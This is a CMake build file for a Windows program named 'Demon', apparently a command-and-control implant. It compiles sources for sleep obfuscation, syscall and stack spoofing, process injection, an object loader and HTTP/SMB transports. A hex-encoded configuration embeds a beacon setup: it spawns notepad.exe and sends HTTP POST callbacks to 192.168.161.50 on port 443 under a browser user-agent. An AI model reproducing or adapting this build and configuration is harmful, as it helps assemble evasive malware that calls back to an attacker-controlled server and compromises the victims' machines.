cmake_minimum_required(VERSION 3.19)
project( Demon C ASM)

set( PROJECT_NAME Demon )

# set compiler settings
#set(CMAKE_BUILD_TYPE Debug)
set( CMAKE_C_STANDARD 11 )
set( CMAKE_C_COMPILER x86_64-w64-mingw32-gcc )
message("TESTTESTTEST")
message("CMAKE_BUILD_TYPE = '${CMAKE_BUILD_TYPE}'")
IF(CMAKE_BUILD_TYPE STREQUAL "Debug")
    message("DEBUG VERSION")
    set( CMAKE_C_FLAGS "-Wl,-e,WinMain -Wl,-Bstatic -g -w -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libgcc -Wl,-Bstatic " )
ENDIF ()

IF(CMAKE_BUILD_TYPE STREQUAL "Release")
    message("RELEASE VERSION")
    set( CMAKE_C_FLAGS "-Wl,--pic-executable,-e,main -Wl,-Bstatic -s -w -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libgcc -Wl,-Bstatic " )
ENDIF()
    # adding demon sources
include_directories( Include )

set(OBJECT_FILES
        bin/Spoof.x64.o
        bin/Syscall.x64.o
)
set( COMMON_SOURCE
        Source/Core/Command.c
        Source/Core/Win32.c
        Source/Core/MiniStd.c
        Source/Core/Token.c
        Source/Core/Package.c
        Source/Core/SleepObf.c
        Source/Core/Spoof.c
        Source/Core/Syscalls.c
        Source/Core/SysNative.c
        Source/Core/Command.c
        Source/Core/Transport.c
        Source/Core/TransportHttp.c
        Source/Core/TransportSmb.c
        Source/Core/Parser.c
        Source/Core/Pivot.c
        Source/Core/Jobs.c
        Source/Core/Download.c
        Source/Core/Dotnet.c
        Source/Core/Socket.c
        Source/Core/Kerberos.c
        Source/Core/Thread.c
        Source/Core/Memory.c
        Source/Core/Runtime.c
        Source/Core/HwBpEngine.c
        Source/Core/HwBpExceptions.c
)

set( INJECT_SOURCE
        Source/Inject/Inject.c
        Source/Inject/InjectUtil.c
)

set( LOADER_SOURCE
        Source/Loader/CoffeeLdr.c
        Source/Loader/ObjectApi.c
)

set( MAIN_SOURCE
        # Demon Main entrypoint
        Source/Demon.c

        # windows exe
        Source/Main/MainExe.c
#
#        # windows dll
#        Source/Main/MainDll.c
#
#        # windows service
#        Source/Main/MainSvc.c
)

set( CRYPT_SOURCE
        Source/Crypt/AesCrypt.c
)

# preprocessor flags
add_compile_definitions( DEBUG )

add_compile_definitions( CONFIG_BYTES={0x02,0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x43,0x00,0x3a,0x00,0x5c,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,0x5c,0x00,0x53,0x00,0x79,0x00,0x73,0x00,0x74,0x00,0x65,0x00,0x6d,0x00,0x33,0x00,0x32,0x00,0x5c,0x00,0x6e,0x00,0x6f,0x00,0x74,0x00,0x65,0x00,0x70,0x00,0x61,0x00,0x64,0x00,0x2e,0x00,0x65,0x00,0x78,0x00,0x65,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x43,0x00,0x3a,0x00,0x5c,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,0x5c,0x00,0x53,0x00,0x79,0x00,0x73,0x00,0x57,0x00,0x4f,0x00,0x57,0x00,0x36,0x00,0x34,0x00,0x5c,0x00,0x6e,0x00,0x6f,0x00,0x74,0x00,0x65,0x00,0x70,0x00,0x61,0x00,0x64,0x00,0x2e,0x00,0x65,0x00,0x78,0x00,0x65,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0a,0x00,0x00,0x00,0x50,0x00,0x4f,0x00,0x53,0x00,0x54,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x1e,0x00,0x00,0x00,0x31,0x00,0x39,0x00,0x32,0x00,0x2e,0x00,0x31,0x00,0x36,0x00,0x38,0x00,0x2e,0x00,0x31,0x00,0x36,0x00,0x31,0x00,0x2e,0x00,0x35,0x00,0x30,0x00,0x00,0x00,0xbb,0x01,0x00,0x00,0x01,0x00,0x00,0x00,0xdc,0x00,0x00,0x00,0x4d,0x00,0x6f,0x00,0x7a,0x00,0x69,0x00,0x6c,0x00,0x6c,0x00,0x61,0x00,0x2f,0x00,0x35,0x00,0x2e,0x00,0x30,0x00,0x20,0x00,0x28,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,0x20,0x00,0x4e,0x00,0x54,0x00,0x20,0x00,0x36,0x00,0x2e,0x00,0x31,0x00,0x3b,0x00,0x20,0x00,0x57,0x00,0x4f,0x00,0x57,0x00,0x36,0x00,0x34,0x00,0x29,0x00,0x20,0x00,0x41,0x00,0x70,0x00,0x70,0x00,0x6c,0x00,0x65,0x00,0x57,0x00,0x65,0x00,0x62,0x00,0x4b,0x00,0x69,0x00,0x74,0x00,0x2f,0x00,0x35,0x00,0x33,0x00,0x37,0x00,0x2e,0x00,0x33,0x00,0x36,0x00,0x20,0x00,0x28,0x00,0x4b,0x00,0x48,0x00,0x54,0x00,0x4d,0x00,0x4c,0x00,0x2c,0x00,0x20,0x00,0x6c,0x00,0x69,0x00,0x6b,0x00,0x65,0x00,0x20,0x00,0x47,0x00,0x65,0x00,0x63,0x00,0x6b,0x00,0x6f,0x00,0x29,0x00,0x20,0x00,0x43,0x00,0x68,0x00,0x72,0x00,0x6f,0x00,0x6d,0x00,0x65,0x00,0x2f,0x00,0x39,0x00,0x36,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x34,0x00,0x36,0x00,0x36,0x00,0x34,0x00,0x2e,0x00,0x31,0x00,0x31,0x00,0x30,0x00,0x20,0x00,0x53,0x00,0x61,0x00,0x66,0x00,0x61,0x00,0x72,0x00,0x69,0x00,0x2f,0x00,0x35,0x00,0x33,0x00,0x37,0x00,0x2e,0x00,0x33,0x00,0x36,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00} )
#add_compile_definitions( CONFIG_SIZE=1024 )
#add_compile_definitions( CONFIG_KEY_BYTES={} )
#add_compile_definitions( CONFIG_KEY_SIZE=16 )
add_compile_definitions( SERVICE_NAME="DemonService" )

add_compile_definitions( TRANSPORT_HTTP )
#add_compile_definitions( TRANSPORT_SMB )
#add_compile_definitions( AES256 )

# linking library
#link_libraries( netapi32 ws2_32 wsock32 wtsapi32 iphlpapi mscoree mscorlib )

# add compiled demons
add_executable( ${PROJECT_NAME} ${COMMON_SOURCE} ${INJECT_SOURCE} ${EXT_SOURCE} ${CRYPT_SOURCE} ${LOADER_SOURCE} ${MAIN_SOURCE} ${OBJECT_FILES})
